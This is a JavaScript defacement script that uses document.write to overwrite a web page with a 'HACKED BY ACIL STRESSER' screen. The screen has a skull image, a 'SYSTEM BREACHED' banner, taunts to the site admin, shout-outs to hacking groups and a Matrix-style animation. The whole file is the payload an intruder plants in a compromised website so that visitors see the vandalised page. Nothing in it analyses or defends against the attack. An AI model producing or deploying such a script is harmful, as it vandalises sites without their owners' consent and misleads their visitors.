document.open();
document.write(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACKED BY ACIL STRESSER</title>
    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Orbitron:wght@900&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier Prime', monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
        }

        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
        }

        .container {
            text-align: center;
            background: rgba(0, 20, 0, 0.8);
            padding: 50px;
            border: 2px solid #0f0;
            box-shadow: 0 0 20px #0f0;
            border-radius: 15px;
            z-index: 1;
        }

        .glitch {
            font-size: 50px;
            font-family: 'Orbitron', sans-serif;
            position: relative;
            color: #fff;
            animation: glitch 1s infinite;
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-5px, 5px); color: #f0f; }
            40% { transform: translate(-5px, -5px); color: #0ff; }
            60% { transform: translate(5px, 5px); color: #0f0; }
            80% { transform: translate(5px, -5px); color: #ff0; }
            100% { transform: translate(0); }
        }

        .skull {
            width: 150px;
            filter: drop-shadow(0 0 10px #0f0);
            margin-bottom: 20px;
        }

        .message {
            margin-top: 20px;
            font-size: 18px;
            color: #0f0;
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            letter-spacing: 5px;
            color: #555;
        }

        marquee {
            width: 100%;
            background: #0f0;
            color: #000;
            font-weight: bold;
            position: absolute;
            bottom: 0;
        }
    </style>
</head>
<body>

    <canvas id="matrix-bg"></canvas>

    <div class="container">
        <img src="https://d.top4top.io/p_3616kfzl31.jpg" class="skull" alt="">
        
        <div class="glitch">SYSTEM BREACHED</div>
        
        <div class="message">
            <p>!! HACKED BY <b>MrSutratorTeam</b> !!</p>
            <p>Hello Admin, Your Security is a Joke.</p>
            <p>We are Everywhere. We are Legion.</p>
        </div>

        <div class="footer">
            [ GREETS: BUTZEXPLOIT - MRSUTRATORTEAM - CYBER GHOST ]
        </div>
    </div>

    <marquee scrollamount="10">SECURITY IS JUST AN ILLUSION - YOU HAVE BEEN TARGETED - FIX YOUR HOLE - ACIL STRESSER WAS HERE</marquee>

    <script>
        // MATRIX EFFECT SCRIPT
        const canvas = document.getElementById('matrix-bg');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const letters = "0101010101HACKEDERRORBREACHACILSTRESSER";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px Courier Prime';
            for (let i = 0; i < drops.length; i++) {
                const text = letters.charAt(Math.floor(Math.random() * letters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);
    </script>
</body>
</html>`);
document.close();